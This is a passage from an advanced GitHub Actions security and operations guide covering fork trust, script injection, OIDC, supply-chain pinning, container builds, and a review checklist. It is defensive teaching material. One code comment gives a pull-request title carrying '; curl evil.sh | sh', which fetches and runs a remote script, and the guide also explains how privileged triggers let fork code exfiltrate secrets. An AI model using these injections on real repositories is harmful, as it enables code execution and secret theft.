This is part three of three. It closes the series by taking **every topic from Beginner and Mid one level further** (each one now has a security, scale, or ownership dimension) and adds the work you own when CI/CD is your responsibility rather than your tool.

## Where this picks up

| Topic from earlier levels | What this level adds |
|---|---|
| Triggers | The **trust model**: which triggers hand fork-influenced code a privileged token |
| Expressions | **Script injection**: why event data must never reach a shell |
| Secrets and `GITHUB_TOKEN` | Least-privilege `permissions`, GitHub App tokens, and OIDC instead of stored keys |
| Caching | Container layer caching with Buildx, and **cache poisoning** |
| Actions you consume | Actions you **author**, and supply-chain controls on the ones you use |
| Reusable workflows | Running them as a **versioned platform** across sixty repositories |
| Runners | Self-hosted strategy, ephemerality, isolation, and the cost model |
| Environments | Their role as an identity boundary, not just an approval gate |
| Matrix and artifacts | Provenance, attestations, and immutable deploy references |
| Debugging | Fleet observability metrics and incident playbooks |
| **new** | Container builds · custom actions · ML delivery · migration · review checklist |

## The trust model: whose code, which secrets, what token

Every workflow run has three properties that together determine your exposure: **whose code executes**, **whether secrets are present**, and **what the token can do**. Most real GitHub Actions vulnerabilities are those three lining up badly.

<div class="guide-arch" style="--arch-cols:3">
  <div class="arch-lane" style="--lane-cols:3">
    <span class="arch-label">safe by design: github withholds the dangerous parts</span>
    <div class="arch-node"><b><code>pull_request</code> from a fork</b><small>Runs <em>fork</em> code · <b>no secrets</b> · read-only token</small></div>
    <div class="arch-node"><b><code>push</code> · same-repo PR</b><small>Runs <em>your</em> code · secrets · token as configured</small></div>
    <div class="arch-node" data-kind="store"><b>Artifacts</b><small>The safe bridge between an untrusted build and a privileged publish</small></div>
  </div>
  <i class="arch-edge" data-dir="down"></i>
  <i class="arch-edge" data-dir="down"></i>
  <i class="arch-edge" data-dir="down" data-flow="optional"></i>
  <div class="arch-lane" style="--lane-cols:3">
    <span class="arch-label">privileged triggers. They undo that protection on purpose</span>
    <div class="arch-node" data-kind="danger"><b><code>pull_request_target</code></b><small>Base-repo code · <b>secrets</b> · writable token</small></div>
    <div class="arch-node" data-kind="danger"><b><code>workflow_run</code></b><small>Base-repo code · secrets · writable token</small></div>
    <div class="arch-node" data-kind="danger"><b><code>issue_comment</code></b><small>Base-repo code · secrets · writable token</small></div>
  </div>
  <i class="arch-edge" data-dir="down" data-flow="optional"></i>
  <i class="arch-edge" data-dir="down"></i>
  <i class="arch-edge" data-dir="down"></i>
  <div class="arch-node" data-kind="danger"><b>+ checkout <code>head.sha</code></b><small>Untrusted code, in a job holding your secrets</small></div>
  <div class="arch-node" data-kind="worker"><b>Read event metadata only</b><small>Label, comment, triage, and never check out the head</small></div>
  <div class="arch-node" data-kind="worker"><b>Split privilege</b><small>Unprivileged job builds; privileged job publishes the artifact</small></div>
  <p class="arch-note"><b>The pattern to internalise:</b> the top lane is safe because secrets are absent, and the middle lane exists because a maintainer needed to label a PR. Combining a privileged trigger with a checkout of fork code is how real repositories have been compromised. The two safe shapes below are the alternatives.</p>
</div>

| Trigger | Executes code from | Secrets | Token |
|---|---|---|---|
| `push` | Your repository | Yes | As configured |
| `pull_request`, same-repo branch | Your repository | Yes | As configured |
| `pull_request` from a **fork** | The fork | **No** | Read-only |
| `pull_request_target` | The **base** repository | **Yes** | Write-capable |
| `workflow_run` | The base repository | Yes | Write-capable |
| `issue_comment` | The base repository | Yes | Write-capable |

Read that until the pattern is obvious: GitHub deliberately makes fork pull requests harmless by withholding secrets and downgrading the token. The dangerous triggers are exactly the ones that undo that protection because a maintainer needed to label a PR or post a comment.

<div class="callout warn">
  <span class="ct">The single most dangerous pattern in GitHub Actions</span>
  <code>pull_request_target</code> combined with checking out <code>github.event.pull_request.head.sha</code>. That executes <b>untrusted fork code</b> in a job that <b>holds your secrets and a writable token</b>. Any build script, test fixture, or lifecycle hook in the fork can print every secret you own. Numerous real repositories have been compromised exactly this way.
</div>

Two safe shapes:

```yaml
# Safe: reads metadata from the event, never runs fork code
on: pull_request_target
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5      # no checkout of head.sha anywhere
```

```yaml
# Safe: split privilege. Unprivileged job builds; privileged job publishes.
# 1) .github/workflows/pr-build.yml — no secrets, fork code runs here
on: pull_request
permissions: { contents: read }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with: { name: preview, path: dist/ }

# 2) .github/workflows/pr-publish.yml — has secrets, never runs fork code
on:
  workflow_run:
    workflows: ['pr-build']
    types: [completed]
permissions: { contents: read, pull-requests: write }
jobs:
  publish:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: preview
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - run: ./upload-preview.sh      # consumes the artifact, never executes it
```

<div class="guide-try">
  <span class="ct">Try it: in a throwaway repository</span>
  <ol>
    <li>Add a <code>pull_request</code> workflow that echoes whether a secret is set, then open a pull request <b>from a fork</b> and confirm it is empty.</li>
    <li>Open a pull request from a branch in the same repository and confirm the secret <b>is</b> present.</li>
    <li>Print <code>github.event_name</code> and <code>github.ref</code> in both cases.</li>
  </ol>
  <em>the fork run has no secret and a read-only token; the same-repo run has both. Having watched GitHub withhold the credential yourself makes the whole table above concrete rather than memorised.</em>
</div>

## Script injection

You have used expressions since Beginner. At this level the concern flips: event data is **attacker-controlled text**, and interpolating it into a shell is interpolating it into source code.

```yaml
# Vulnerable. A PR titled  "; curl evil.sh | sh ;  executes on your runner.
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe. The value arrives as data through the environment, never as shell source.
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

The rule is absolute and easy to apply: **`${{ github.event.* }}` never appears inside a `run` body.** Branch names, issue titles, comment bodies, commit messages, and author names are all attacker-controlled.

The same applies to `actions/github-script` and to any action input you build from event data:

```yaml
# Vulnerable — the payload is spliced into JavaScript source
- uses: actions/github-script@v7
  with:
    script: console.log("${{ github.event.issue.title }}")

# Safe — read it from the environment at runtime
- uses: actions/github-script@v7
  env:
    TITLE: ${{ github.event.issue.title }}
  with:
    script: console.log(process.env.TITLE)
```

<div class="guide-try">
  <span class="ct">Try it: on a repository you own, nowhere else</span>
  <ol>
    <li>Add a step with the vulnerable form: <code>run: echo "Title: ${{ github.event.pull_request.title }}"</code>.</li>
    <li>Open a pull request titled <code>test"; echo INJECTED; #</code> and read the log.</li>
    <li>Switch to the <code>env</code> form and re-run with the same title.</li>
  </ol>
  <em>the vulnerable version prints <code>INJECTED</code>, because your title became a command. The <code>env</code> version prints the title as literal text. Five minutes here is worth more than any amount of reading about injection.</em>
</div>

## Permissions: least privilege

Mid mentioned `permissions` in passing. The whole mechanism is one block of YAML.

```yaml
permissions:
  contents: read              # a read-only floor for the entire workflow

jobs:
  release:
    permissions:
      contents: write         # widened for exactly one job
      packages: write
      id-token: write         # required for OIDC
    runs-on: ubuntu-latest
```

The mechanic that makes this powerful: **declaring any scope sets every undeclared scope to `none`.** A single `contents: read` line at the top removes the token's ability to push, tag, comment, or publish, and you then grant back only what a specific job needs.

| Scope | Grants |
|---|---|
| `contents` | Read/write repository code, tags, releases |
| `pull-requests` | Comment on, label, and modify PRs |
| `issues` | Same for issues |
| `packages` | Push to GitHub Packages / GHCR |
| `id-token` | Request an OIDC token: **required** for cloud federation |
| `actions` | Manage workflow runs and artifacts |
| `attestations` | Write build provenance |

Set the **organisation default** to read-only contents and make workflows opt in. That one setting makes every new repository safe by default rather than dependent on each author remembering.

Two limits drive real architecture:

**A reusable workflow receives the caller's token**, so its `permissions` can never exceed the caller's. Declaring them in the callee documents the contract and fails loudly when a caller is too restrictive.

**`GITHUB_TOKEN` cannot reach another repository.** Cross-repository automation needs a GitHub App installation token or a fine-grained PAT, and prefer the App. A PAT carries a human's full access, does not expire with the job, and appears in the audit trail as that person rather than as automation.

```yaml
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    repositories: other-repo

- env:
    GH_TOKEN: ${{ steps.app-token.outputs.token }}   # scoped, short-lived
  run: gh release create v1.0.0 --repo my-org/other-repo
```

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Write a job with no <code>permissions</code> block that uses <code>GITHUB_TOKEN</code> to create a label via the API. Confirm it succeeds.</li>
    <li>Add <code>permissions: { contents: read }</code> at workflow level and re-run.</li>
    <li>Add <code>issues: write</code> to just that job and re-run again.</li>
    <li>Check your organisation's default token permission setting.</li>
  </ol>
  <em>step two fails with a 403: declaring one scope zeroed everything else, which is the entire mechanism. Step three passes. You have now seen least privilege enforced rather than described.</em>
</div>

## OIDC: deployment without stored credentials

Beginner and Mid stored cloud keys as secrets. At this level you remove them entirely. The runner requests a short-lived signed token, and the cloud exchanges it for temporary credentials.

```yaml
permissions:
  id-token: write             # allow the job to request an identity token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: aws sts get-caller-identity     # prove the identity before deploying
```

<div class="guide-timeline">
  <div class="guide-timeline-item"><span>1</span><strong>The job requests a token</strong><small>GitHub signs a short-lived JWT whose claims describe the repository, ref, environment, and workflow.</small></div>
  <div class="guide-timeline-item"><span>2</span><strong>The cloud verifies the signature</strong><small>GitHub's OIDC provider is registered once as a trusted identity provider in the account.</small></div>
  <div class="guide-timeline-item"><span>3</span><strong>The trust policy inspects the claims</strong><small>This is the part that matters, and the part that is usually wrong.</small></div>
  <div class="guide-timeline-item"><span>4</span><strong>Temporary credentials are issued</strong><small>Valid for the job and then gone. Nothing to rotate, nothing to leak from a log.</small></div>
</div>

<div class="callout warn">
  <span class="ct">Where OIDC is almost always misconfigured</span>
  A trust policy matching <code>repo:my-org/*:*</code> means <b>any branch of any repository in the organisation</b> can assume that role, including a branch an attacker opens a pull request from. Constrain the <code>sub</code> claim: <code>repo:my-org/my-repo:ref:refs/heads/main</code>, or better <code>repo:my-org/my-repo:environment:production</code>, which makes the environment's approval gate part of the identity itself.
</div>

Verify the constraint rather than trusting it. Open a pull request from a throwaway branch with a workflow that tries to assume the role. It should be refused. If it succeeds, your condition is too broad and the approval gate is decorative.

<div class="guide-try">
  <span class="ct">Try it: the verification is the point</span>
  <ol>
    <li>Set up a cloud role whose trust policy is deliberately broad: <code>repo:YOUR-ORG/*:*</code>. Assume it from a workflow and run <code>sts get-caller-identity</code>.</li>
    <li>Now push a branch called <code>attacker-test</code> with the same workflow and confirm it <b>also</b> succeeds.</li>
    <li>Tighten the <code>sub</code> claim to <code>repo:YOUR-ORG/YOUR-REPO:environment:production</code> and add <code>environment: production</code> to the job.</li>
    <li>Run from <code>attacker-test</code> again.</li>
  </ol>
  <em>the broad policy lets any branch assume the role. That is the misconfiguration in production systems today. After tightening, the throwaway branch is refused. Never ship an OIDC role without running step four.</em>
</div>

## Supply chain

A `uses:` line is a decision to execute somebody else's code in a job that may hold your credentials. Mid taught you to pin tags; the full control set is wider.

| Control | Removes |
|---|---|
| Pin third-party actions to a full commit SHA | A moving tag being repointed at malicious code |
| Dependabot on `github-actions` | Those pins going stale and unpatched |
| Organisation policy allowing only selected actions | An unvetted action entering through any repository |
| Vendor critical actions into your own organisation | Dependence on an account you do not control |
| `permissions: contents: read` by default | A compromised step's ability to push |
| Environment protection on deploy jobs | Any automated path to production without review |
| Artifact attestations | Being unable to prove which workflow built an artifact |

```yaml
# The pin, with the human-readable version in a trailing comment
- uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3  # v3.5.0
```

```yaml .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    groups:
      actions:
        patterns: ['*']       # one pull request a week instead of fifteen
```

Pinning without updating is its own failure: a frozen action is an unpatched one. The two controls only work together.

Two less obvious surfaces worth raising unprompted:

**Caches are a write surface.** A pull request branch can poison a cache that a later `main` run restores. Never restore something and then execute it without verification, which is why you cache dependency *downloads* rather than installed, executable trees.

**Self-hosted runners on public repositories are dangerous**, because any fork pull request can execute code on a machine that persists between jobs.

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Run the audit one-liner over a real repository: list every third-party <code>uses:</code> that is not pinned to a 40-character SHA.</li>
    <li>Pin one of them, keeping the version in a trailing comment.</li>
    <li>Add the <code>dependabot.yml</code> with grouped updates and wait for the first pull request.</li>
    <li>Check your organisation's <b>Actions permissions</b> setting for an allow-list.</li>
  </ol>
  <em>most repositories have several unpinned third-party actions. The Dependabot pull request is what makes pinning sustainable, since pinning without it leaves a frozen, unpatched dependency.</em>
</div>

## Container builds and layer caching

Mid cached dependencies. Container builds need a different cache entirely, and it is usually the slowest job in a pipeline.

```yaml
permissions:
  contents: read
  packages: write
  attestations: write
  id-token: write

steps:
  - uses: actions/checkout@v4
  - uses: docker/setup-buildx-action@v3

  - uses: docker/login-action@v3
    with:
      registry: ghcr.io
      username: ${{ github.actor }}
      password: ${{ secrets.GITHUB_TOKEN }}

  - id: push
    uses: docker/build-push-action@v6
    with:
      push: ${{ github.event_name != 'pull_request' }}
      tags: |
        ghcr.io/${{ github.repository }}:sha-${{ github.sha }}
        ghcr.io/${{ github.repository }}:latest
      cache-from: type=gha
      cache-to: type=gha,mode=max
      provenance: true
      sbom: true

  - uses: actions/attest-build-provenance@v1
    with:
      subject-name: ghcr.io/${{ github.repository }}
      subject-digest: ${{ steps.push.outputs.digest }}
      push-to-registry: true
```

| Decision | Why |
|---|---|
| Buildx | BuildKit gives a real layer cache, multi-platform builds, and exportable cache backends |
| `type=gha` | Right for one repository; a **registry** cache when many repos or self-hosted runners share layers |
| `mode=max` | Exports intermediate layers too: better hit rate on multi-stage builds |
| `push:` false on PRs | A fork must never be able to publish to your registry |
| `:sha-…` tag | Immutable and traceable; `:latest` is for humans, never a deploy reference |
| `provenance` + attestation | Proves which workflow and commit produced the image |

`linux/arm64` under emulation is several times slower than native. For anything on the critical path, build each architecture on its own native runner and merge the manifests.

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Build a multi-stage image in CI with <code>cache-to: type=gha,mode=min</code>. Run twice and note the build time.</li>
    <li>Change to <code>mode=max</code> and run twice more.</li>
    <li>Open a pull request and confirm <code>push:</code> evaluates false so nothing is published.</li>
    <li>Inspect the pushed image's provenance attestation.</li>
  </ol>
  <em><code>mode=min</code> barely helps because only the final stage is cached; <code>mode=max</code> exports the intermediate layers and the second build is faster. The pull request builds without publishing, which is the boundary that stops a fork pushing to your registry.</em>
</div>

## Authoring your own actions

You have consumed actions since Beginner and written composite actions in Mid. When a capability belongs to many repositories, publish it properly.

| Type | Runs as | Reach for it when | Watch out for |
|---|---|---|---|
| Composite | Steps inside the caller's job | Packaging a repeated step sequence | `shell:` required on every `run` |
| JavaScript | Node on the runner | Real logic, API calls, cross-platform | The bundled `dist/` must be committed |
| Docker container | A container on the runner | An arbitrary toolchain, any language | Linux runners only; image pull cost per job |

```yaml action.yml
name: Deploy to our platform
description: Resolves the target environment and triggers a deployment
inputs:
  environment:
    description: Target environment name
    required: true
  wait:
    description: Block until the deployment settles
    default: 'true'
outputs:
  url:
    description: Public URL of the deployment
runs:
  using: node20
  main: dist/index.js
  post: dist/cleanup.js       # runs even if the job fails — good for teardown
branding:
  icon: upload-cloud
  color: blue
```

```javascript src/index.js
const core = require('@actions/core')
const github = require('@actions/github')

async function run() {
  try {
    const environment = core.getInput('environment', { required: true })
    const wait = core.getBooleanInput('wait')

    core.info(`Deploying to ${environment}`)
    core.setSecret(process.env.DEPLOY_TOKEN)     // mask it in logs

    const url = await deploy(environment, { wait })
    core.setOutput('url', url)
    await core.summary.addHeading('Deployed').addLink(url, url).write()
  } catch (error) {
    core.setFailed(error.message)
  }
}
run()
```

JavaScript actions start fastest and behave identically on all three operating systems, but dependencies are not installed for you, so bundle with `@vercel/ncc` and commit the output. Docker actions are the most flexible and the slowest. Composite actions cannot define jobs, matrices, or their own runner; when you need those, you need a reusable workflow.

Version a published action the way the ecosystem expects: release `v1.2.3` and keep a mutable `v1` tag pointing at the newest compatible release.

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Write a JavaScript action that reads one input, sets one output, and writes to the job summary via <code>core.summary</code>.</li>
    <li>Bundle it with <code>ncc build src/index.js -o dist</code> and commit <code>dist/</code>.</li>
    <li>Reference it locally with <code>uses: ./.github/actions/my-action</code> and read its output.</li>
    <li>Now delete <code>dist/</code> and run again.</li>
    <li>Tag it <code>v1.0.0</code>, then create a <code>v1</code> tag pointing at the same commit.</li>
  </ol>
  <em>without the committed bundle the action fails to start, because dependencies are never installed for you. The double tag is the convention every published action follows, and now you know why.</em>
</div>

## Reusable workflows as a platform

Mid showed the mechanism. At this level you are running it as a product for other teams.

<ol class="guide-steps">
  <li><b>One repository owns the standard</b>An organisation <code>.github</code> repository holding reusable workflows and composite actions, with CODEOWNERS on the workflow directory so changes are reviewed by the people who carry the pager.</li>
  <li><b>Version with a moving major tag</b>Consumers pin <code>@v2</code>. You release <code>v2.7.0</code> and move <code>v2</code>. A fix reaches sixty repositories without sixty pull requests, and a breaking change becomes <code>v3</code> with a migration note rather than a silent surprise.</li>
  <li><b>Canary before you move the tag</b>One low-risk repository pins the exact patch release. Green for a day, then move the major tag. Skip this and one bad release breaks every team simultaneously.</li>
  <li><b>Treat inputs as a public API</b>Types, defaults, descriptions. Removing an input is a breaking change even if one repository used it, and the failure lands on somebody else's pull request.</li>
  <li><b>Pass secrets explicitly</b><code>secrets: inherit</code> hands the callee everything the caller can see. Listing the two it needs documents the contract and bounds the damage from a bad release.</li>
  <li><b>Enforce with policy, not documentation</b>Organisation settings restricting which actions may run, required checks in branch protection, and required review on workflow files. A standard that depends on everyone remembering is not a standard.</li>
</ol>

<div class="callout warn">
  <span class="ct">The failure mode of a shared pipeline</span>
  A team needs one small change, cannot get it upstream quickly, and forks. Six months later there are eleven forks and no standard. The fix is <b>turnaround time</b> on upstream changes, not a policy. If a reasonable request takes two weeks, forking is the rational choice and you will lose.
</div>

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Publish a reusable workflow in one repository, tag it <code>v1.0.0</code>, and add a moving <code>v1</code> tag.</li>
    <li>Call it from a second repository pinned to <code>@v1</code>.</li>
    <li>Make a breaking change, release <code>v1.1.0</code>, and move <code>v1</code> to it. Watch the consumer break without changing.</li>
    <li>Revert by moving <code>v1</code> back, then redo it as <code>v2</code> with the consumer opting in.</li>
  </ol>
  <em>step three is the incident you are trying to prevent: one tag move breaking every consumer at once. Step four is the discipline that prevents it, and feeling the difference is more persuasive than any policy document.</em>
</div>

## Runners: strategy and cost

| Situation | Choice | Why |
|---|---|---|
| Public repository, ordinary CI | GitHub-hosted | Free minutes, fresh machine, no state to leak |
| Private repository, CPU-bound | Larger hosted runner | Same isolation model, more cores, no fleet to run |
| GPU, licensed tooling, VPC-only service | Self-hosted, **ephemeral** | The only options that reach the hardware or network |
| Public repository with fork PRs | **Never** self-hosted | Untrusted code plus persistent state |
| Many repositories, one custom image | Hosted runner with `container:` | The image is the standard; the runner stays disposable |

If you run self-hosted, the non-negotiables are: **ephemeral**, meaning one job per runner and then destroy the VM or container; scoped to specific repositories rather than the whole organisation; in a network segment that cannot reach production directly; and never schedulable by a fork-triggered workflow.

On cost: Windows minutes bill at roughly twice Linux and macOS at roughly ten times. A matrix that includes macOS "for completeness" can become most of your bill, and larger hosted runners are almost always cheaper than the engineering time to operate your own fleet.

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Run the same job on <code>ubuntu-latest</code>, <code>windows-latest</code>, and <code>macos-latest</code> and record each duration.</li>
    <li>Multiply by the billing factors (Windows ×2, macOS ×10) to get the true relative cost.</li>
    <li>Open <b>Settings → Billing → Actions</b> and find which workflow consumes the most minutes.</li>
  </ol>
  <em>a macOS job that takes the same wall-clock time costs roughly ten times as much. The billing page usually reveals one workflow nobody knew was expensive, often a matrix that grew an axis.</em>
</div>

## Observability

"CI is slow" is an opinion. Numbers make it a priority, and there are only four you need.

| Signal | Source |
|---|---|
| Median and p95 duration per workflow | The REST API for workflow runs |
| Failure rate, split into real failures and flakes | Run conclusions plus re-run counts |
| Queue time | Gap between run creation and job start |
| Cost by workflow and runner label | Actions usage metrics |

```yaml
# Pull the numbers into a scheduled report
- env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    gh api -X GET '/repos/${{ github.repository }}/actions/runs' \
      -f per_page=100 --jq '
        [.workflow_runs[]
         | select(.conclusion != null)
         | { name, conclusion,
             mins: (((.updated_at|fromdate) - (.run_started_at|fromdate)) / 60) }]
        | group_by(.name)[]
        | { workflow: .[0].name,
            runs: length,
            failed: [.[] | select(.conclusion == "failure")] | length,
            p95: (sort_by(.mins) | .[(length * 0.95) | floor].mins) }' \
      | tee -a "$GITHUB_STEP_SUMMARY"
```

Be careful with debugging actions that open an interactive shell on a runner. They are useful and they are also a live session on a machine holding your secrets, so restrict them to jobs that have none.

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Run the <code>gh api</code> command above against a busy repository and read the p95 per workflow.</li>
    <li>Count how many runs have <code>run_attempt &gt; 1</code>. That is your re-run rate, a proxy for flakiness.</li>
    <li>Compute queue time as the gap between <code>created_at</code> and <code>run_started_at</code>.</li>
    <li>Put all of it into a scheduled workflow that writes to the step summary.</li>
  </ol>
  <em>four numbers you did not have before. The re-run rate is usually the surprising one, and it is the number that turns "CI feels flaky" into a fundable piece of work.</em>
</div>

## Machine-learning delivery

If your pipelines build models rather than binaries, the shape changes. CI for software asks "does this work?"; CI for a model asks "is it good enough, and can I prove what produced it?"

<div class="guide-compare">
  <div class="guide-compare-col good">
    <h4>Carries over unchanged</h4>
    <ul>
      <li>Lint, type-check, unit tests on the training code</li>
      <li>Dependency caching, matrices, artifacts</li>
      <li>Environments and approvals for promotion</li>
      <li>OIDC for cloud access</li>
    </ul>
  </div>
  <div class="guide-compare-col bad">
    <h4>New concerns</h4>
    <ul>
      <li>Data validation as a gate, not an afterthought</li>
      <li>Metric thresholds that fail the job rather than log a number</li>
      <li>Comparison against the currently deployed model</li>
      <li>Lineage: which commit, dataset version, and run produced this artifact</li>
      <li>GPU runners, long jobs, and the six-hour job ceiling</li>
    </ul>
  </div>
</div>

State the architectural answer explicitly, because it demonstrates judgement: **Actions is the orchestrator and the audit trail, not the compute.** It validates cheaply, submits work to a platform built for training, waits, gates on the returned metrics, and records the promotion. Proposing a six-hour GPU job on a hosted runner reads as inexperience.

```yaml .github/workflows/train.yml
name: Train and gate

on:
  workflow_dispatch:
    inputs:
      dataset:
        description: Dataset version to train on
        required: true
  schedule:
    - cron: '0 2 * * 1'

permissions:
  contents: read
  id-token: write

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11', cache: pip }
      - run: pip install -r requirements.txt
      - name: Validate before spending money on GPUs
        run: python -m pipeline.validate --dataset "${{ inputs.dataset }}"

  train:
    needs: validate
    runs-on: ubuntu-latest
    timeout-minutes: 60
    outputs:
      run-id: ${{ steps.submit.outputs.run-id }}
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.TRAINING_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - id: submit
        name: Submit to the platform built for this, and wait
        run: python -m pipeline.submit --wait --dataset "${{ inputs.dataset }}"

  gate:
    needs: train
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Compare against what is deployed today
        run: |
          python -m pipeline.compare \
            --candidate "${{ needs.train.outputs.run-id }}" \
            --baseline production \
            --min-delta 0.0
      - name: Put the numbers where the reviewer will see them
        if: always()
        run: python -m pipeline.summary >> "$GITHUB_STEP_SUMMARY"

  promote:
    needs: gate
    runs-on: ubuntu-latest
    environment: model-production
    permissions: { id-token: write, contents: read }
    steps:
      - run: python -m pipeline.promote "${{ needs.train.outputs.run-id }}"
```

Four decisions there are the whole lesson. Validation runs on a cheap runner before an expensive one is provisioned. The gate is a **comparison against production**, not a hard-coded threshold, so it survives a changing dataset. Metrics go to the step summary so the approver does not download a zip. Promotion is a separate job behind an environment, which buys the approval, the scoped credentials, and a deployment record naming the commit and the run.

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Build the four-job shape with stubs: <code>validate</code> exits non-zero on a bad input file, <code>train</code> just sleeps and emits a run id, <code>gate</code> compares two numbers, <code>promote</code> sits behind an environment.</li>
    <li>Feed it a deliberately malformed dataset and confirm it fails in <code>validate</code>, before any expensive job starts.</li>
    <li>Make the candidate metric worse than the baseline and confirm <code>gate</code> blocks promotion.</li>
    <li>Write the comparison to the step summary and approve the promotion from the run page.</li>
  </ol>
  <em>the pipeline refuses bad data cheaply and refuses a worse model politely, with the numbers visible to whoever approves. That shape is the whole architectural argument: Actions orchestrates and records; it does not train.</em>
</div>

## Migrating from an existing CI system

You will be asked this. The answer that lands is a sequence, not a tool comparison.

<ol class="guide-steps">
  <li><b>Inventory the existing jobs</b>What triggers them, what credentials they hold, what network they reach, and which are required checks.</li>
  <li><b>Port the leaf jobs first</b>The ones nothing depends on. They prove the runner story, the network access, and the credential model with minimal risk.</li>
  <li><b>Run both systems in parallel</b>Actions non-blocking, so a gap in your port does not block anyone from merging.</li>
  <li><b>Move required checks one at a time</b>As each Actions job earns trust, switch branch protection to it and retire the old one.</li>
  <li><b>Decommission deliberately</b>Old CI kept "just in case" becomes an unpatched server with production credentials.</li>
</ol>

The important judgement: **do not port the old pipeline verbatim.** A great deal of Jenkinsfile logic exists to work around a persistent workspace and shared mutable state, problems Actions does not have. Reimplementing those workarounds imports complexity you no longer need.

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Take one real job from an existing CI system and list what it needs: triggers, credentials, network reach, and required-check status.</li>
    <li>Port it to Actions as a <b>non-required</b> check running in parallel with the original.</li>
    <li>Compare results over a few days, then flip branch protection to the new check.</li>
    <li>Note anything in the original that exists only to reset a dirty workspace, and delete it rather than porting it.</li>
  </ol>
  <em>the parallel period is what makes migration safe, and that last step is where most of the simplification comes from: a large share of legacy CI logic exists to work around persistent state that Actions does not have.</em>
</div>

## The review checklist

Most incidents are prevented at review time, not at runtime. This is the whole series compressed into what you look for in a workflow pull request.

| Check | Looking for |
|---|---|
| `on:` triggers | Any `pull_request_target`, `workflow_run`, or `issue_comment`. Each gives fork-influenced runs a privileged token |
| Checkout ref | A `pull_request_target` job checking out `head.sha`: the classic exfiltration pattern |
| `permissions` | Present, minimal, widened per job rather than per workflow |
| Third-party `uses:` | SHA-pinned, from a recognisable source, covered by Dependabot |
| Interpolation | No `${{ github.event.* }}` inside a `run` body or a `github-script` block |
| Secrets | Never echoed, never in a job that runs untrusted code, environment-scoped where possible |
| `concurrency` | Present; cancelling on CI, **not** cancelling on deploys |
| `timeout-minutes` | Present on every job |
| Cache | Key hashes a lockfile; nothing executable is restored and then run unverified |
| Required checks | Job names unchanged, or branch protection updated in the same change |

<div class="callout note">
  <span class="ct">Make the checklist enforceable</span>
  CODEOWNERS on <code>.github/workflows/**</code> routes every workflow change to the team that owns CI. Combined with an organisation policy allowing only selected actions, the checklist stops depending on whoever happens to pick up the review.
</div>

<div class="guide-try">
  <span class="ct">Try it</span>
  <ol>
    <li>Apply the checklist to a workflow you did not write, ideally in a repository you have just inherited.</li>
    <li>Write down every row that fails.</li>
    <li>Fix the two highest-risk findings and open a pull request.</li>
    <li>Add CODEOWNERS on <code>.github/workflows/**</code> so future changes route to your team.</li>
  </ol>
  <em>almost every unreviewed workflow fails at least three rows, usually a missing <code>permissions</code> floor, an unpinned third-party action, and no <code>timeout-minutes</code>. CODEOWNERS is what stops the list regrowing.</em>
</div>

## The complete picture

The series' final pipeline: every level's topics, hardened.

```yaml .github/workflows/release.yml
name: Release

on:
  push:
    branches: [main]
    paths-ignore: ['docs/**', '**/*.md']

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false          # never cancel a release mid-flight

permissions:
  contents: read                     # read-only floor

jobs:
  test:
    uses: my-org/.github/.github/workflows/reusable-ci.yml@v2
    with:
      python-version: '3.12'
    secrets:
      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}

  image:
    needs: test
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      contents: read
      packages: write
      attestations: write
      id-token: write
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false        # no push token left in the workspace

      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - id: push
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:sha-${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true
          sbom: true

      - uses: actions/attest-build-provenance@v1
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

  deploy:
    needs: image
    runs-on: ubuntu-latest
    environment:
      name: production                     # approval gate + scoped identity
      url: https://app.example.com
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    permissions:
      id-token: write                      # OIDC — no stored cloud keys
      contents: read
    steps:
